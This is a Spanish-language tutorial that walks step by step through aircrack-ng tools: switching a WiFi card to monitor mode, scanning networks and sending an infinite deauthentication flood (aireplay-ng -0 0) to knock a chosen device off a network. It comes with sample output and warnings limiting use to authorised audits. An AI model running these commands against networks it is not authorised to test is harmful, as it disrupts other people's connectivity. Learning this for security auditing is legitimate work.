# Guía para el análisis y control de dispositivos en redes WiFi

Esta guía explica paso a paso cómo monitorear y desconectar dispositivos conectados a una red WiFi utilizando herramientas como `aircrack-ng`. **Advertencia: Este procedimiento solo debe realizarse con autorización expresa en redes propias o para auditoría ética.**

## Índice
1. [Requisitos previos](#requisitos-previos)
2. [Verificar el modo de la tarjeta de red](#verificar-el-modo-de-la-tarjeta-de-red)
3. [Cambiar la tarjeta a modo monitor](#cambiar-la-tarjeta-a-modo-monitor)
4. [Confirmar el modo monitor](#confirmar-el-modo-monitor)
5. [Escanear redes WiFi disponibles](#escanear-redes-wifi-disponibles)
6. [Monitorear una red específica](#monitorear-una-red-específica)
7. [Desconectar un dispositivo de la red](#desconectar-un-dispositivo-de-la-red)
8. [Advertencia ética y legal](#advertencia-ética-y-legal)
9. [Recursos](#recursos)

---

## Requisitos previos

- **Sistema operativo**: Linux (preferiblemente Kali Linux).
- **Tarjeta de red**: Compatible con modo monitor.
- **Herramientas instaladas**:
  - `aircrack-ng`
  - `iwconfig`
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`

**Instalación en Kali Linux**:
```bash
sudo apt update && sudo apt install aircrack-ng
```

---

## Verificar el modo de la tarjeta de red

**Comando**:
```bash
iwconfig
```

**Ejemplo de salida**:
```
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Frequency:2.437 GHz  Access Point: Not-Associated
```

> **Nota**: Si el modo es `Managed`, cámbialo a `Monitor` en el siguiente paso.

---

## Cambiar la tarjeta a modo monitor

**Comando**:
```bash
sudo airmon-ng start [nombre_tarjeta]
```

**Ejemplo**:
```bash
sudo airmon-ng start wlan0
```

**Resultado esperado**:
```
Found 1 processes that could cause trouble.
Killing process with PID 1234 (NetworkManager).

Interface       Chipset         Driver
wlan0           Atheros         ath9k - [phy0]
                (monitor mode enabled on wlan0mon)
```

> **Nota**: La interfaz ahora se llamará `[nombre_tarjeta]mon`, por ejemplo, `wlan0mon`. Además el internet se va desactivar.

---

## Confirmar el modo monitor

**Comando**:
```bash
iwconfig
```

**Ejemplo de salida**:
```
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  
```

> **Nota**: Confirma que el modo es `Monitor`. Si no lo es, repite el paso anterior.

---

## Escanear redes WiFi disponibles

**Comando**:
```bash
airodump-ng --band a [interfaz_monitor]
```

**Ejemplo**:
```bash
airodump-ng --band a wlan0mon
```

**Ejemplo de salida parcial**:
```
 BSSID              PWR  Beacons    CH  ENC  ESSID
 00:11:22:33:44:55  -30      102     36  WPA2 MiRedWiFi

 STATION            PWR  Rate  Lost  Frames  Probe
 66:77:88:99:AA:BB  -40  1e-1e     0     100  AmazonEcho
```

> **Nota**: Anota el `[BSSID]`, `[canal]` (CH) de la red (MAC del dispositivo conectado). Presiona `Ctrl+C` para salir.

---

## Monitorear una red específica

**Comando**:
```bash
airodump-ng --band a -c [canal] --bssid [BSSID] [interfaz_monitor]
```

**Ejemplo**:
```bash
airodump-ng --band a -c 36 --bssid 00:11:22:33:44:55 wlan0mon
```

> **Nota**: Este comando enfoca la escucha solo en la red seleccionada, mostrando los dispositivos conectados.

---

## Desconectar un dispositivo de la red

**Comando**:
```bash
aireplay-ng -0 0 -a [BSSID_red] -c [MAC_dispositivo] [interfaz_monitor]
```

**Ejemplo**:
```bash
aireplay-ng -0 0 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
```

**Explicación**:
- `-0 0`: Modo deautenticación infinita.
- `-a [BSSID_red]`: MAC del router (BSSID de la red).
- `-c [MAC_dispositivo]`: MAC del dispositivo objetivo (por ejemplo, un parlante).
- `[interfaz_monitor]`: Interfaz en modo monitor.

**Ejemplo de salida**:
```
Sending DeAuth to station -- BSSID: [00:11:22:33:44:55] STATION: [66:77:88:99:AA:BB]
DeAuth frame sent...
```

> **Nota**: Este comando fuerza la desconexión del dispositivo enviando paquetes de deautenticación.

---

## Advertencia ética y legal

El uso de estos comandos en redes o dispositivos sin consentimiento **es ilegal en muchos países** y puede tener consecuencias legales graves. Esta guía está destinada únicamente a auditorías de seguridad **con permiso explícito**. Úsala de forma responsable y ética.

---

## Recursos

- **Documentación**: [Aircrack-ng](https://www.aircrack-ng.org/)
- **Comandos relacionados**:
  - `iwconfig`
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`
